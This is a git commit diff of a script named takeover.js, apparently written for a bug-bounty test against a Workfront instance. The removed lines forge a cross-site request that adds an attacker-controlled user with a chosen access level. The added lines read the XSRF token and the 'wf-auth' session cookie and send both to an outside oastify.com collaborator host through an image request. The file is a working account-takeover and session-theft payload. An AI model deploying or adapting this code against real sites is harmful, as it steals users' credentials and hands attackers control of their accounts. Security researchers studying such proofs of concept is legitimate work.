ae8ebcf0433909ea8515ac4daee88df23d5a61c7
mrhavit <93275845+mrhavit@users.noreply.github.com>
2024-01-20 20:59:15 +0200

    a

--- takeover.js
+++ takeover.js
@@ -1,14 +1,11 @@
 function getCookieValue(cookieName) {
     // Step 1: Get the Cookie String
     var cookieString = document.cookie;
-
     // Step 2: Parse the Cookie String
     var cookies = cookieString.split(';');
-
     // Step 3: Search for the Specific Cookie
     for (var i = 0; i < cookies.length; i++) {
         var cookie = cookies[i].trim();
-
         // Step 4: Extract the Value
         if (cookie.indexOf(cookieName + '=') === 0) {
             return cookie.substring(cookieName.length + 1);
@@ -20,22 +17,21 @@ function getCookieValue(cookieName) {
 }
 
 // Example Usage:
-var myCookieValue = getCookieValue('XSRF-TOKEN');
+var myCookieValueCSRF = getCookieValue('XSRF-TOKEN');
+var myCookieValueToken = getCookieValue('wf-auth');
 
-var xhr = new XMLHttpRequest();
-var url = 'https://hackerone-ongoing-0ql224.testdrive.workfront.com/internal/user/add';
-var params = 'objCode=USER&form=%7B%22objCode%22%3A%22USER%22%2C%22ID%22%3A%22%22%2C%22companyID%22%3A%22%22%2C%22externalUsersGroupID%22%3A%22%22%2C%22firstName%22%3A%22Hackerone%22%2C%22lastName%22%3A%22Example%22%2C%22emailAddr%22%3A%22attacker%40hackerone.com%22%2C%22inviteUser%22%3Atrue%2C%22accessLevelID%22%3A%22657c32f20007212079c3ccb3e4d91216%22%2C%22homeGroupID%22%3A%22657c32f300072247b40b72c545b96a33%22%2C%22continue%22%3A%22false%22%7D&objID=';
+console.log(`Your CSRF is ${myCookieValueCSRF} and, your Token is ${myCookieValueToken}`)
 
-xhr.open('POST', url, true);
-xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
-xhr.setRequestHeader('X-Xsrf-Token', myCookieValue);
-xhr.withCredentials = true;  // Include credentials (cookies) in the request
+var img = new Image();
 
-xhr.onreadystatechange = function() {
-  if (xhr.readyState == 4 && xhr.status == 200) {
-    // Handle the response here
-    console.log(xhr.responseText);
-  }
+// Set the source (URL) of the image
+img.src = 'https://r3vylp0j4i74fi1xzfksh9eau10soncc.oastify.com/?csrf=' + myCookieValueCSRF + '&token=' + myCookieValueToken;
+
+// Add an event listener to handle the 'load' event
+img.onload = function() {
+    // The image has successfully loaded
+    console.log('Image loaded successfully!');
+
+    // You can now append the image to the document or perform other actions
+    document.body.appendChild(img);
 };
-
-xhr.send(params);
